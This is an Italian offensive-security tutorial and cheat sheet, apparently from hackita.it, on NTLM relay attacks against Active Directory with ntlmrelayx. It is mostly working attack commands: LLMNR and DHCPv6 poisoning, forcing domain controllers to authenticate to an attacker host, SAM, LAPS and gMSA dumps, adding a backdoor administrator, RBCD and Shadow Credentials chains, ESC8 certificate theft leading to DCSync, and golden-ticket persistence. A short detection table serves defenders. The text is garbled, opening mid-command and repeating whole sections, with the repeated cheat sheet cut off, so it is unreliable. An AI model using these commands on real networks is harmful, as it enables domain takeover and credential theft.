  corp.local/'WS01$' /tmp/ws01.ccache
KRB5CCNAME=/tmp/ws01.ccache python3 getnthash.py -key AS_REP_KEY corp.local/'WS01$'
nxc smb WS01.corp.local -u 'WS01$' -H NThash
```

Dettagli in [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/).

***

## Scenario 5 — LDAP Relay → Dump LAPS / gMSA / ADCS info

```bash
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-laps
# Hostname        | AdmPwd
# WS01.corp.local | R@nd0mL@ps!

sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-gmsa
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-adcs   # template ESC info
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --add-computer 'EVIL$' 'EvilPass123!'
```

***

## Scenario 6 — HTTP Relay → ESC8 (AD CS) → DCSync

Questo scenario non dipende da SMB signing o LDAP signing — HTTP non ha signing, funziona sempre se EPA non è attivo sul CA.

```bash
# Step 1 — Verifica
curl -I http://CA_IP/certsrv/
# WWW-Authenticate: NTLM → vulnerabile

# Step 2 — ntlmrelayx verso Web Enrollment
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support

# Step 3 — Coerci il DC verso l'attaccante
python3 PetitPotam.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5

# Quando arriva autenticazione DC01$:
# [*] Certificate successfully requested
# [*] Base64 certificate of user DC01$: MIIRLAIBAz...

# Step 4 — Autenticati come DC01$ e DCSync
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.5
# → NT hash di DC01$

KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass \
  -just-dc-ntlm corp.local/'DC01$'@DC01.corp.local
```

Percorso ADCS completo in [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/).

***

## Scenario 7 — MSSQL Relay → xp\_cmdshell

```bash
sudo ntlmrelayx.py -t mssql://10.10.10.30 -smb2support -socks
proxychains -q impacket-mssqlclient -no-pass -windows-auth corp.local/admin@10.10.10.30

SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
```

Approfondimento in [porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/).

***

## Scenario 8 — Cross-protocol relay con `--remove-mic`

Quando SMB signing è richiesto ma LDAP signing non lo è, usi `--remove-mic` per strippare il MIC dall'autenticazione NTLM e relayarla cross-protocol.

```bash
# SMB → LDAP (rimuove MIC per aggirare protezione cross-protocol)
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --remove-mic

# SMB → LDAPS
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --remove-mic

# Utile anche con NTLMv1 (che non ha MIC nativamente)
```

***

## Scenario 9 — Multi-relay (-tf)

```bash
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay.txt
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -w
# Un'unica autenticazione → relay contemporaneo su TUTTI i target
# -w aggiorna la lista live
```

***

## Limitazioni e workaround

| Protezione                      | Cosa blocca                | Workaround                                   |
| ------------------------------- | -------------------------- | -------------------------------------------- |
| SMB signing richiesto           | SMB relay                  | Relay su LDAP/HTTP/MSSQL; WebDAV coercion    |
| LDAP signing richiesto          | LDAP write relay           | Usa LDAPS; `--remove-mic` cross-protocol     |
| LDAPS Channel Binding (CBT)     | LDAPS relay                | HTTP/ADCS relay; molto difficile da aggirare |
| EPA su AD CS                    | ESC8 relay                 | Non aggirabile se configurato correttamente  |
| LLMNR/NBT-NS disabilitato       | Responder passivo          | mitm6 + coercizione attiva                   |
| PetitPotam patchato (anon)      | EFS coercion anonima       | Versione autenticata; PrinterBug; DFSCoerce  |
| Print Spooler disabilitato      | PrinterBug                 | DFSCoerce; PetitPotam autenticato; Coercer   |
| Microsoft Defender for Identity | Rileva relay + coercizione | Riduci velocità; usa sessioni esistenti      |

***

## Detection

| Tecnica                       | Event ID            | Indicatore                                                   |
| ----------------------------- | ------------------- | ------------------------------------------------------------ |
| LLMNR poisoning               | 4648                | Logon esplicito verso IP insolito                            |
| Relay SMB                     | 4624 Type 3         | Login di rete da IP attaccante                               |
| Relay LDAP                    | 4662                | Modifica msDS-AllowedToActOnBehalfOf, msDS-KeyCredentialLink |
| PetitPotam / PrinterBug       | 4769                | Machine account autentica verso IP non DC                    |
| ESC8                          | 4886                | Richiesta cert per account macchina ($) da IP insolito       |
| Shadow Credentials            | 4662                | Modifica msDS-KeyCredentialLink                              |
| RBCD                          | 4662                | Modifica msDS-AllowedToActOnBehalfOfOtherIdentity            |
| Cross-protocol (--remove-mic) | 4624 + correlazione | NTLM senza MIC su ambienti moderni                           |

***

## Workflow completo — da rete interna a Domain Admin

```
FASE 1 — RECON
├── nxc smb subnet --gen-relay-list relay.txt   → trova target SMB unsigned
├── nxc ldap DC -u user -p pass -M ldap-checker → verifica LDAP signing
├── curl -I http://CA_IP/certsrv/               → verifica ESC8
└── nxc smb subnet -M webdav                    → verifica WebDAV

FASE 2 — DECISION TREE
├── SMB signing OFF → SMB relay (più semplice)
├── LDAP signing OFF → LDAP/LDAPS relay (AD manipulation)
├── ESC8 → HTTP relay verso ADCS (più devastante)
└── Niente → mitm6 + WebDAV coercion

FASE 3 — SETUP (3 terminal paralleli)
├── T1: ntlmrelayx con target e azioni
├── T2: Responder (HTTP/SMB off) OPPURE mitm6
└── T3: coercizione attiva (PrinterBug/PetitPotam/DFSCoerce)

FASE 4 — IMPATTO
├── SMB relay → SAM dump → PtH laterale
├── LDAPS relay → RBCD/Shadow Creds → getST → DA
├── ESC8 → certificato DC$ → secretsdump → tutti gli hash
└── MSSQL → xp_cmdshell → shell

FASE 5 — PERSISTENZA
└── Hash krbtgt → Golden Ticket → /articoli/golden-ticket
```

***

## Cheat Sheet completo

```bash
# === RECON ===
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay.txt
nxc ldap DC -u user -p pass -M ldap-checker
nxc smb subnet -u user -p pass -M webdav
curl -I http://CA_IP/certsrv/

# === SETUP RESPONDER ===
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf
sudo responder -I eth0 -rdwv

# === COERCIZIONE ===
python3 printerbug.py corp.local/user:pass@DC_IP ATTACKER_IP
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER_IP DC_IP
python3 dfscoerce.py -u user -p pass -d corp.local ATTACKER_IP DC_IP
python3 Coercer.py coerce -t DC_IP -l ATTACKER_IP -u user -p pass -d corp.local

# === SMB RELAY ===
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support
sudo ntlmrelayx.py -t smb://TARGET -smb2support -c "whoami"
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -i   # → nc 127.0.0.1 11000
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -socks
proxychains impacket-secretsdump -no-pass CORP/admin@TARGET

# === LDAP/LDAPS RELAY ===
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support              # dump + auto
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support             # write complete
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support --remove-mic # cross-protocol
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support --delegate-access -6  # RBCD
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support \
  --shadow-credentials --shadow-target 'HOST$'               # Shadow Creds
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-laps
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-gmsa

# === ESC8 ===
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support
certipy auth -pfx dc01.pfx -dc-ip DC_IP
impacket-secretsdump -k -no-pass -just-dc-ntlm corp.local/'DC01$'@DC_IP

# === MSSQL ===
sudo ntlmrelayx.py -t mssql://SQL_IP -smb2support -socks
proxychains impacket-mssqlclient -no-pass -windows-auth corp.local/admin@SQL_IP

# === IPv6 (mitm6) ===
sudo mitm6 -d corp.local -i eth0
sudo ntlmrelayx.py -6 -t ldaps://DC_IP --delegate-access -smb2support

# === RBCD CHAIN COMPLETA ===
# 1. ntlmrelayx --delegate-access → XEWRIYIH$ con password
# 2. impacket-getST -spn cifs/TARGET.corp.local -impersonate Administrator \
#      -dc-ip DC_IP corp.local/'XEWRIYIH$':'pass'
# 3. export KRB5CCNAME=Administrator.ccache
# 4. impacket-secretsdump -k -no-pass -just-dc corp.local/Administrator@DC_IP
```

**Articoli correlati:**

* [Impacket: suite completa](https://hackita.it/articoli/impacket/)
* [Responder: LLMNR/NBT-NS poisoning](https://hackita.it/articoli/responder/)
* [SMB — porta 445 e attacchi](https://hackita.it/articoli/smb/)
* [RBCD — Resource-Based Constrained Delegation](https://hackita.it/articoli/rbcd/)
* [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/)
* [getST.py — S4U2Self/S4U2Proxy](https://hackita.it/articoli/getst/)
* [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/)
* [DCSync](https://hackita.it/articoli/dcsync/)
* [addcomputer.py](https://hackita.it/articoli/addcomputer/)
* [Man-in-the-Middle: tecniche e tool](https://hackita.it/articoli/man-in-the-middle/)
* [Active Directory: exploitation](https://hackita.it/articoli/active-directory/)
* [secretsdump.py](https://hackita.it/articoli/secretsdump/)
* [Porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/)

> Uso esclusivo in ambienti autorizzati.

\#impacket #ntlm-relay #active-directory #windows
'EvilPass123!'

# RBCD automatico — --delegate-access crea computer + configura delega

sudo ntlmrelayx.py -t ldaps\://10.10.10.5 -smb2support --delegate-access

# Shadow Credentials — inietta chiave in msDS-KeyCredentialLink

sudo ntlmrelayx.py -t ldaps\://10.10.10.5 -smb2support \
\--shadow-credentials --shadow-target 'WS01

***

### LDAPS (`ldaps://`)

**Perché funziona:** LDAPS è LDAP over TLS. Non ha lo stesso problema di signing — la cifratura TLS del canale non è legata crittograficamente all'autenticazione NTLM (salvo Channel Binding / CBT attivo). Permette tutte le operazioni write che LDAP con signing blocca.

**Perché fallisce:** LDAP Channel Binding (CBT) tying lega l'autenticazione NTLM al certificato TLS del server — il relay viene rigettato perché l'attaccante non ha il certificato del DC. Abilitato su DC moderni con patch recenti.

```
LDAPS senza CBT → relay funziona + write complete → RBCD, Shadow Creds, user creation
LDAPS con CBT   → relay rigettato → usa HTTP/ADCS
```

| Cosa puoi fare              | Requisito                        |
| --------------------------- | -------------------------------- |
| Tutto ciò che LDAP permette | +                                |
| Shadow Credentials          | Write su msDS-KeyCredentialLink  |
| Add computer account        | MachineAccountQuota > 0          |
| RBCD completo               | Write sul computer object target |

***

### HTTP / HTTPS (`http://` / `https://`)

**Perché funziona:** HTTP non supporta message signing — non esiste un meccanismo equivalente a SMB signing o LDAP signing. Questo significa che **qualsiasi** autenticazione NTLM su HTTP può essere relayata, indipendentemente dalla configurazione del dominio. È per questo che ESC8 è così devastante: il Web Enrollment di AD CS accetta NTLM su HTTP per default.

**Perché fallisce:** EPA (Extended Protection for Authentication) su HTTPS lega il token NTLM al canale TLS — il relay viene rigettato. Se il CA ha EPA abilitato, ESC8 non funziona.

```
HTTP senza EPA  → relay SEMPRE possibile → ADCS, Exchange, OWA, web app
HTTP con EPA    → relay rigettato
```

| Target HTTP                        | Vettore                             |
| ---------------------------------- | ----------------------------------- |
| AD CS Web Enrollment (`/certsrv/`) | ESC8 → certificato per DC$ → DCSync |
| Exchange EWS                       | Accesso mailbox, lateral movement   |
| OWA (Outlook Web App)              | Accesso email                       |
| IIS con NTLM auth                  | Accesso app                         |
| WPAD                               | Cattura hash durante browsing       |

***

### MSSQL (`mssql://`)

**Perché funziona:** SQL Server supporta Windows Authentication via NTLM come metodo legacy. Non ha signing equivalente a SMB. Un relay NTLM verso SQL Server viene accettato come autenticazione Windows legittima.

**Perché fallisce:** se SQL Server usa solo SQL Authentication (non Windows Auth), il relay NTLM non ha senso. Se l'account relayed non ha permessi sul DB, ottieni accesso limitato.

```
MSSQL con Windows Auth → relay funziona → login SQL
Account relayed = sysadmin → xp_cmdshell → RCE
```

| Cosa puoi fare      | Requisito                 |
| ------------------- | ------------------------- |
| Login al database   | Windows Auth abilitata    |
| Query dati          | Permessi SELECT           |
| `xp_cmdshell` → RCE | sysadmin role             |
| Lettura file server | `BULK INSERT`, OPENROWSET |

***

### IMAP / SMTP

Meno usati in scenari AD puri, ma rilevanti in ambienti Exchange on-premise.

```
IMAP relay → accesso mailbox → lettura email, esfiltrazione dati
SMTP relay → invio email → phishing interno da account legittimo
```

***

## Decision tree — cosa usi in base a cosa trovi

```
HAI UN'AUTENTICAZIONE NTLM (da Responder/coercizione)?
│
├── Target ha SMB signing OFF?
│   └── SÌ → SMB relay → SAM dump, exec, file access
│           → ntlmrelayx.py -tf relay.txt -smb2support
│
├── Target ha LDAP signing OFF?
│   └── SÌ (write) → LDAP relay → RBCD, dump, user creation
│           → ntlmrelayx.py -t ldap://DC_IP -smb2support
│       └── LDAPS senza CBT → ancora meglio → Shadow Credentials + RBCD
│               → ntlmrelayx.py -t ldaps://DC_IP -smb2support
│
├── AD CS Web Enrollment esposto (ESC8)?
│   └── SÌ → HTTP relay → certificato DC$ → DCSync completo
│           → ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
│
├── SQL Server con Windows Auth?
│   └── SÌ → MSSQL relay → login → se sysadmin → xp_cmdshell
│           → ntlmrelayx.py -t mssql://SQL_IP -smb2support -socks
│
├── Exchange / OWA esposto?
│   └── SÌ → HTTP relay → accesso mailbox
│
├── Nulla funziona con questa autenticazione?
│   └── Cambia vittima della coercizione
│       → Coerci un account con più privilegi (machine account, service account)
│       → WebDAV coercion per bypassare SMB signing
│       → --remove-mic per cross-protocol relay
│
└── SMB signing ovunque + LDAP signing + no ADCS?
    └── mitm6 → LDAPS relay → RBCD → getST → DA
```

***

## Step 0 — Verifica prima di tutto

```bash
# SMB signing — genera target list direttamente
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay_targets.txt
# "signing:False" → relay target

# Verifica LDAP signing sul DC
nxc ldap 10.10.10.5 -u user -p pass -M ldap-checker
# "LDAP Signing: NOT required" → relay LDAP possibile

# Verifica ESC8 (Web Enrollment senza EPA)
curl -I http://CA_IP/certsrv/
# "WWW-Authenticate: NTLM" → ESC8 vulnerabile

# Verifica WebClient (WebDAV) sulle workstation
nxc smb 10.10.10.0/24 -u user -p pass -M webdav

# Verifica MachineAccountQuota (per RBCD)
nxc ldap 10.10.10.5 -u user -p pass -M maq
```

***

## Step 1 — Cattura l'autenticazione NTLM

### Responder — LLMNR/NBT-NS poisoning (passivo)

[Responder](https://hackita.it/articoli/responder/) avvelena le risoluzioni DNS fallite. Quando un host non trova `\\TYPO` via DNS, manda un broadcast LLMNR — Responder risponde e cattura l'autenticazione. **Devi** disabilitare SMB e HTTP perché ntlmrelayx deve gestire quelle porte.

```bash
# Configura Responder
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf

# Lancia in poisoning mode
sudo responder -I eth0 -rdwv

# Solo ascolto (recon senza poisoning)
sudo responder -I eth0 -A
```

### mitm6 — DHCPv6 poisoning

Windows preferisce IPv6 su IPv4. mitm6 risponde alle richieste DHCPv6 dichiarandosi DNS server IPv6 e avvelena le risoluzioni. Funziona anche con LLMNR disabilitato.

```bash
pip3 install mitm6
sudo mitm6 -d corp.local -i eth0

# ntlmrelayx deve girare con -6
sudo ntlmrelayx.py -6 -t ldaps://10.10.10.5 --delegate-access -smb2support
```

> mitm6 non è immediato: Windows rinnova DHCP al reboot o a eventi di rete. Aspetta 5–30 minuti.

***

## Step 2 — Tecniche di coercizione (autenticazione forzata)

La coercizione forza un host specifico (anche il DC) ad autenticarsi verso di te senza aspettare. Richiede credenziali low-privilege di dominio.

### PrinterBug / SpoolSample (MS-RPRN)

Abusa il Print Spooler. Il target torna verso l'attaccante con il proprio machine account. Richiede Print Spooler attivo.

```bash
python3 printerbug.py corp.local/user:Password123@10.10.10.5 10.10.14.1
# 10.10.10.5 = host da coercere (es. DC)
# 10.10.14.1 = IP attaccante

# Verifica se Print Spooler è attivo
nxc smb 10.10.10.5 -u user -p pass -M spooler
```

### PetitPotam (MS-EFSR)

Abusa EFS (Encrypting File System). La versione **autenticata** funziona anche post-patch.

```bash
# Autenticata (funziona post-CVE-2022-26925)
python3 PetitPotam.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5

# Unauthenticated (solo sistemi non patchati)
python3 PetitPotam.py 10.10.14.1 10.10.10.5

# WebDAV variant — esce via HTTP invece di SMB (bypassa SMB signing!)
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER@80/test 10.10.10.5
```

### DFSCoerce (MS-DFSNM)

Non patchato — funziona su sistemi aggiornati.

```bash
python3 dfscoerce.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5
```

### ShadowCoerce (MS-FSRVP)

```bash
python3 shadowcoerce.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5
```

### Coercer — aggrega tutti i metodi

[Coercer](https://github.com/p0dalirius/Coercer) testa automaticamente 12+ metodi e usa quello che funziona.

```bash
pip3 install coercer

# Scan — verifica senza coercere
python3 Coercer.py scan -t 10.10.10.5 -u user -p Password123 -d corp.local -v

# Coerce con tutti i metodi
python3 Coercer.py coerce -t 10.10.10.5 -l 10.10.14.1 \
  -u user -p Password123 -d corp.local --always-continue
```

### WebDAV coercion — bypassa SMB signing

Se WebClient è attivo, la coercizione esce via HTTP (porta 80) invece di SMB. HTTP non ha signing → puoi relayarla anche quando SMB signing è richiesto ovunque.

```bash
# Verifica WebClient
nxc smb 10.10.10.0/24 -u user -p pass -M webdav

# ntlmrelayx ascolta su HTTP
sudo ntlmrelayx.py -t ldaps://10.10.10.5 --delegate-access --http-port 80 -smb2support

# Coercione verso HTTP (WebDAV)
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER@80/test WS01_IP
```

***

## Opzioni globali ntlmrelayx

| Opzione            | Descrizione                                            |
| ------------------ | ------------------------------------------------------ |
| `-t TARGET`        | Target singolo                                         |
| `-tf FILE`         | File con lista target                                  |
| `-smb2support`     | **Sempre mettilo** — abilita SMB2                      |
| `-6`               | Supporto IPv6 (per mitm6)                              |
| `-i`               | Shell interattiva → accessibile via nc                 |
| `-socks`           | Mantieni sessione aperta per proxychains               |
| `-c COMANDO`       | Esegui comando su relay SMB                            |
| `-e FILE`          | Carica ed esegui file sul target                       |
| `--remove-mic`     | Rimuovi MIC (CVE-2019-1040) — per cross-protocol relay |
| `--no-dump`        | Non fare SAM dump automatico                           |
| `--no-da`          | Non tentare aggiunta a Domain Admins                   |
| `--no-acl`         | Non modificare ACL                                     |
| `-w`               | Monitora file target per aggiornamenti live            |
| `--http-port PORT` | Porta HTTP listener                                    |
| `--no-http-server` | Disabilita HTTP server                                 |
| `--no-smb-server`  | Disabilita SMB server                                  |

***

## Scenario 1 — SMB Relay → SAM dump + exec

```bash
# SAM dump automatico su tutti i target
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support

# Con exec
sudo ntlmrelayx.py -t smb://10.10.10.20 -smb2support \
  -c "net user attacker Pass123! /add && net localgroup Administrators attacker /add"

# Interactive shell
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -i
# → nc 127.0.0.1 11000
```

### Cosa fare con gli hash SAM

```bash
nxc smb 10.10.10.0/24 -u Administrator -H NThash --local-auth
impacket-secretsdump corp.local/administrator:pass@10.10.10.20
```

***

## Scenario 2 — SOCKS mode → accesso persistente

```bash
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -socks

# Lista sessioni attive
ntlmrelayx> socks

# Via proxychains — usa qualsiasi tool come se fossi autenticato
echo "socks4 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains -q impacket-secretsdump -no-pass CORP/admin@TARGET
proxychains -q nxc smb TARGET -u admin -p '' --no-bruteforce
```

***

## Scenario 3 — LDAP Relay → RBCD → Domain Admin

```bash
# Step 1 — relay LDAPS con --delegate-access
sudo ntlmrelayx.py -t ldaps://10.10.10.5 --delegate-access -smb2support -6

# Step 2 — mitm6 o coercizione per far autenticare WS01$
sudo mitm6 -d corp.local -i eth0
# Quando WS01$ autentica:
# [*] Adding new computer: XEWRIYIH$ with password: Rand0mP@ss!
# [*] Delegating to WS01$ via msDS-AllowedToActOnBehalfOfOtherIdentity

# Step 3 — getST e accesso come Administrator
impacket-getST -spn cifs/WS01.corp.local -impersonate Administrator \
  -dc-ip 10.10.10.5 corp.local/'XEWRIYIH$':'Rand0mP@ss!'
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@WS01.corp.local
```

Flusso completo in [RBCD](https://hackita.it/articoli/rbcd/) e [getST.py](https://hackita.it/articoli/getst/).

***

## Scenario 4 — LDAPS Relay → Shadow Credentials

Più stealth di RBCD — non crea computer account.

```bash
sudo ntlmrelayx.py -t ldaps://10.10.10.5 \
  --shadow-credentials --shadow-target 'WS01$' \
  --pfx-password 'CertPass123' --export-type PEM \
  --cert-outfile-path /tmp/ws01_shadow -smb2support

# Usa il certificato
python3 gettgtpkinit.py -cert-pfx /tmp/ws01_shadow.pfx -pfx-pass 'CertPass123' \
  corp.local/'WS01$' /tmp/ws01.ccache
KRB5CCNAME=/tmp/ws01.ccache python3 getnthash.py -key AS_REP_KEY corp.local/'WS01$'
nxc smb WS01.corp.local -u 'WS01$' -H NThash
```

Dettagli in [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/).

***

## Scenario 5 — LDAP Relay → Dump LAPS / gMSA / ADCS info

```bash
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-laps
# Hostname        | AdmPwd
# WS01.corp.local | R@nd0mL@ps!

sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-gmsa
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-adcs   # template ESC info
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --add-computer 'EVIL$' 'EvilPass123!'
```

***

## Scenario 6 — HTTP Relay → ESC8 (AD CS) → DCSync

Questo scenario non dipende da SMB signing o LDAP signing — HTTP non ha signing, funziona sempre se EPA non è attivo sul CA.

```bash
# Step 1 — Verifica
curl -I http://CA_IP/certsrv/
# WWW-Authenticate: NTLM → vulnerabile

# Step 2 — ntlmrelayx verso Web Enrollment
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support

# Step 3 — Coerci il DC verso l'attaccante
python3 PetitPotam.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5

# Quando arriva autenticazione DC01$:
# [*] Certificate successfully requested
# [*] Base64 certificate of user DC01$: MIIRLAIBAz...

# Step 4 — Autenticati come DC01$ e DCSync
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.5
# → NT hash di DC01$

KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass \
  -just-dc-ntlm corp.local/'DC01$'@DC01.corp.local
```

Percorso ADCS completo in [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/).

***

## Scenario 7 — MSSQL Relay → xp\_cmdshell

```bash
sudo ntlmrelayx.py -t mssql://10.10.10.30 -smb2support -socks
proxychains -q impacket-mssqlclient -no-pass -windows-auth corp.local/admin@10.10.10.30

SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
```

Approfondimento in [porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/).

***

## Scenario 8 — Cross-protocol relay con `--remove-mic`

Quando SMB signing è richiesto ma LDAP signing non lo è, usi `--remove-mic` per strippare il MIC dall'autenticazione NTLM e relayarla cross-protocol.

```bash
# SMB → LDAP (rimuove MIC per aggirare protezione cross-protocol)
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --remove-mic

# SMB → LDAPS
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --remove-mic

# Utile anche con NTLMv1 (che non ha MIC nativamente)
```

***

## Scenario 9 — Multi-relay (-tf)

```bash
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay.txt
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -w
# Un'unica autenticazione → relay contemporaneo su TUTTI i target
# -w aggiorna la lista live
```

***

## Limitazioni e workaround

| Protezione                      | Cosa blocca                | Workaround                                   |
| ------------------------------- | -------------------------- | -------------------------------------------- |
| SMB signing richiesto           | SMB relay                  | Relay su LDAP/HTTP/MSSQL; WebDAV coercion    |
| LDAP signing richiesto          | LDAP write relay           | Usa LDAPS; `--remove-mic` cross-protocol     |
| LDAPS Channel Binding (CBT)     | LDAPS relay                | HTTP/ADCS relay; molto difficile da aggirare |
| EPA su AD CS                    | ESC8 relay                 | Non aggirabile se configurato correttamente  |
| LLMNR/NBT-NS disabilitato       | Responder passivo          | mitm6 + coercizione attiva                   |
| PetitPotam patchato (anon)      | EFS coercion anonima       | Versione autenticata; PrinterBug; DFSCoerce  |
| Print Spooler disabilitato      | PrinterBug                 | DFSCoerce; PetitPotam autenticato; Coercer   |
| Microsoft Defender for Identity | Rileva relay + coercizione | Riduci velocità; usa sessioni esistenti      |

***

## Detection

| Tecnica                       | Event ID            | Indicatore                                                   |
| ----------------------------- | ------------------- | ------------------------------------------------------------ |
| LLMNR poisoning               | 4648                | Logon esplicito verso IP insolito                            |
| Relay SMB                     | 4624 Type 3         | Login di rete da IP attaccante                               |
| Relay LDAP                    | 4662                | Modifica msDS-AllowedToActOnBehalfOf, msDS-KeyCredentialLink |
| PetitPotam / PrinterBug       | 4769                | Machine account autentica verso IP non DC                    |
| ESC8                          | 4886                | Richiesta cert per account macchina ($) da IP insolito       |
| Shadow Credentials            | 4662                | Modifica msDS-KeyCredentialLink                              |
| RBCD                          | 4662                | Modifica msDS-AllowedToActOnBehalfOfOtherIdentity            |
| Cross-protocol (--remove-mic) | 4624 + correlazione | NTLM senza MIC su ambienti moderni                           |

***

## Workflow completo — da rete interna a Domain Admin

```
FASE 1 — RECON
├── nxc smb subnet --gen-relay-list relay.txt   → trova target SMB unsigned
├── nxc ldap DC -u user -p pass -M ldap-checker → verifica LDAP signing
├── curl -I http://CA_IP/certsrv/               → verifica ESC8
└── nxc smb subnet -M webdav                    → verifica WebDAV

FASE 2 — DECISION TREE
├── SMB signing OFF → SMB relay (più semplice)
├── LDAP signing OFF → LDAP/LDAPS relay (AD manipulation)
├── ESC8 → HTTP relay verso ADCS (più devastante)
└── Niente → mitm6 + WebDAV coercion

FASE 3 — SETUP (3 terminal paralleli)
├── T1: ntlmrelayx con target e azioni
├── T2: Responder (HTTP/SMB off) OPPURE mitm6
└── T3: coercizione attiva (PrinterBug/PetitPotam/DFSCoerce)

FASE 4 — IMPATTO
├── SMB relay → SAM dump → PtH laterale
├── LDAPS relay → RBCD/Shadow Creds → getST → DA
├── ESC8 → certificato DC$ → secretsdump → tutti gli hash
└── MSSQL → xp_cmdshell → shell

FASE 5 — PERSISTENZA
└── Hash krbtgt → Golden Ticket → /articoli/golden-ticket
```

***

## Cheat Sheet completo

```bash
# === RECON ===
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay.txt
nxc ldap DC -u user -p pass -M ldap-checker
nxc smb subnet -u user -p pass -M webdav
curl -I http://CA_IP/certsrv/

# === SETUP RESPONDER ===
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf
sudo responder -I eth0 -rdwv

# === COERCIZIONE ===
python3 printerbug.py corp.local/user:pass@DC_IP ATTACKER_IP
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER_IP DC_IP
python3 dfscoerce.py -u user -p pass -d corp.local ATTACKER_IP DC_IP
python3 Coercer.py coerce -t DC_IP -l ATTACKER_IP -u user -p pass -d corp.local

# === SMB RELAY ===
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support
sudo ntlmrelayx.py -t smb://TARGET -smb2support -c "whoami"
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -i   # → nc 127.0.0.1 11000
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -socks
proxychains impacket-secretsdump -no-pass CORP/admin@TARGET

# === LDAP/LDAPS RELAY ===
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support              # dump + auto
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support             # write complete
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support --remove-mic # cross-protocol
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support --delegate-access -6  # RBCD
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support \
  --shadow-credentials --shadow-target 'HOST$'               # Shadow Creds
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-laps
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-gmsa

# === ESC8 ===
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support
certipy auth -pfx dc01.pfx -dc-ip DC_IP
impacket-secretsdump -k -no-pass -just-dc-ntlm corp.local/'DC01$'@DC_IP

# === MSSQL ===
sudo ntlmrelayx.py -t mssql://SQL_IP -smb2support -socks
